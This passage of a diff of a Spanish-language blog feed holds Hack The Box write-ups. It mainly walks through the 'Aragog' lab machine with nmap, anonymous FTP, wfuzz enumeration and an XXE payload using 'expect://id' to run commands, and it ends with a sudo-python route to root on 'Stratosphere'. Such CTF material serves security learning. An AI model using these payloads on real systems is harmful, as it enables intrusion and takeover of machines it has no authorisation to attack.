+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;richard@stratosphere:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /home/richard/test.py 
+root@stratosphere:/home/richard# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+root@stratosphere:/home/richard#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Stratosphere en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Jeeves</title><link href="http://localhost:4000/htb-jeeves/" rel="alternate" type="text/html" title="Hack The Box Jeeves" /><published>2021-10-11T00:00:00-05:00</published><updated>2021-10-11T00:00:00-05:00</updated><id>http://localhost:4000/htb-jeeves</id><content type="html" xml:base="http://localhost:4000/htb-jeeves/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/banner-jeeves.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;jeeves&quot;&gt;Jeeves&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.63.&lt;/p&gt;
@@ -4424,522 +5154,4 @@ root
 &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;A este punto ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><summary type="html">Resolución de la máquina October en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Aragog</title><link href="http://localhost:4000/htb-aragog/" rel="alternate" type="text/html" title="Hack The Box Aragog" /><published>2021-09-20T00:00:00-05:00</published><updated>2021-09-20T00:00:00-05:00</updated><id>http://localhost:4000/htb-aragog</id><content type="html" xml:base="http://localhost:4000/htb-aragog/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-aragog/banner-aragog.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;aragog&quot;&gt;Aragog&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.78.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.78
-PING 10.10.10.78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.78: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;143 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.78 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 143.053/143.053/143.053/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.78 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-20 00:43 CDT
-Initiating SYN Stealth Scan at 00:43
-Scanning 10.10.10.78 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.10.78
-Discovered open port 21/tcp on 10.10.10.78
-Discovered open port 80/tcp on 10.10.10.78
-Completed SYN Stealth Scan at 00:44, 22.05s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.78
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2021-09-20 00:43:45 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;22s
-Not shown: 51923 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 13609 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT   STATE SERVICE REASON
-21/tcp open  ftp     syn-ack ttl 63
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;22.36 seconds
-           Raw packets sent: 108742 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.785MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 57740 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.310MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.78
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,22,80
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,80 10.10.10.78 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-20 00:45 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.78
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to ::ffff:10.10.14.16
-|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 1
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.38 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Analizando los resultados obtenidos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, vemos que podemos acceder al servicio FTP como el usuario &lt;em&gt;anonymous&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.78
-Connected to 10.10.10.78.
-220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.78:k4miyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
-230 Login successful.
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-150 Here comes the directory listing.
-&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;    1 ftp      ftp            86 Dec 21  2017 test.txt
-226 Directory send OK.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 ftp      ftp          4096 Dec 21  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x    2 ftp      ftp          4096 Dec 21  2017 ..
-&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;    1 ftp      ftp            86 Dec 21  2017 test.txt
-226 Directory send OK.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Aquí vemos sólo el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt;, por lo que procedemos a descargarlo a nuestra máquina para ver su contenido:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; binary
-200 Switching to Binary mode.
-ftp&amp;gt; get test.txt
-&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: test.txt remote: test.txt
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;test.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;86 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-226 Transfer complete.
-86 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.2061 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Abrimos el archivo y vemos que no presente contenido interesando; sin embargo, tiene un formato de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xml&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;test.txt
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: test.txt
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ &amp;lt;details&amp;gt;
-   2   │     &amp;lt;subnet_mask&amp;gt;255.255.255.192&amp;lt;/subnet_mask&amp;gt;
-   3   │     &amp;lt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/test&amp;gt;
-   4   │ &amp;lt;/details&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tambíen vemos que se encuentra abierto el puerto 80, por lo que ya sabemos que debemos ver las tecnologías que usa:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.78/
-http://10.10.10.78/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.78], Title[Apache2 Ubuntu Default Page: It works]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el título de la página, vemos que se trata de la web default de Apache. También lo podemos corroborar accediendo vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-aragog/aragog_web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A este punto, vamos a tratar de descubrir posibles recursos que se encuentre dentro del sitio web. Para este caso vamos a usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para enumrar:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.78
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-20 00:55 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.78
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE
-80/tcp open  http
-
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.84 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En este caso no nos trajo información, por lo que vamos con un diccionario más grandes y tirando de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;968 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.78/FUZZ
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.78/FUZZ
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                         
-=====================================================================
-
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Despúes de un buen rato, no encontramos ningún directorio en el servidor. Así que ahora vamos a buscar que recursos, primeramente creandonos un archivo donde pongamos algunas extensiones de archivos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;extensiones.txt
-───────┬───────────────────────────────────────────────────────────────────────
-       │ File: extensiones.txt
-───────┼───────────────────────────────────────────────────────────────────────
-   1   │ txt
-   2   │ php
-   3   │ php3
-   4   │ php4
-   5   │ php5
-   6   │ xml
-   7   │ html
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y volvemos a utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; agregando nuestro nuevo archivo de extensiones:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;968 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; extensiones.txt http://10.10.10.78/FUZZ.FUZ2Z
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.78/FUZZ.FUZ2Z
-Total requests: 882240
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                         
-=====================================================================
-
-000000054:   403        11 L     32 W       290 Ch      &quot;php&quot;                                                           
-000000056:   403        11 L     32 W       291 Ch      &quot;html&quot;                                                          
-000024082:   200        3 L      6 W        46 Ch       &quot;hosts - php&quot;                                                   
-^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
-
-Total time: 0
-Processed Requests: 26495
-Filtered Requests: 26492
-Requests/sec.: 0
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que existe un recurso denomiando &lt;strong&gt;hosts.php&lt;/strong&gt;, por lo que accedemos  y vemos lo siguiente:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-aragog/aragog_hosts.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;“&lt;em&gt;There are 4294967294 possible hosts for&lt;/em&gt;”, dicha frase hace referencia a los hosts que se encuentran en una red con determinada máscara; por lo tanto encontramos relación con el archivo &lt;strong&gt;test.txt&lt;/strong&gt; que encontramos por FTP.&lt;/p&gt;
-
-&lt;p&gt;Ahora, analizando un poco, vemos que el archivo &lt;strong&gt;test.txt&lt;/strong&gt; tiene un formato en XML; buscando un poco, vemos que existe una vulnerabilidad relacionada a XML denominada XXE (XML External Entity) que podríamos probar. Para hacerlo, vamos a hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; en conjunto con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d&lt;/code&gt; para que el sitio nos pueda leer un archivo, para este caso el &lt;strong&gt;test.txt&lt;/strong&gt; y ver que nos arroja:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; @test.txt http://10.10.10.78/hosts.php
-
-There are 62 possible hosts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;255.255.255.192
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Podemos corroborar que el sitio es vulnerable a ataques de tipo XXE; por lo tanto en vez de que el sitio nos lea el archivo &lt;strong&gt;test.txt&lt;/strong&gt;, vamos a buscar una forma de poder ingresar a la máquina víctima. Si quieremos saber un poco más al respecto, podemos consultar la siguiente liga:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing&quot;&gt;XML External Entity (XXE) Processing)&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Haciendo una pruebas, vemos que se crea una entidad llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxe&lt;/code&gt;, el cual lo sustituimos en el campo que es leido por el servidor, para este caso el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subnet_mask&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISO-8859-1&quot;&lt;/span&gt;?&amp;gt;
-&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE foo
-  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ELEMENT foo ANY &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-   &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ENTITY xxe SYSTEM &lt;span class=&quot;s2&quot;&gt;&quot;expect://id&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;]&amp;gt;&lt;/span&gt;
-&amp;lt;details&amp;gt;
-    &amp;lt;subnet_mask&amp;gt;&amp;amp;xxe&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;/subnet_mask&amp;gt;
-    &amp;lt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/test&amp;gt;
-&amp;lt;/details&amp;gt;
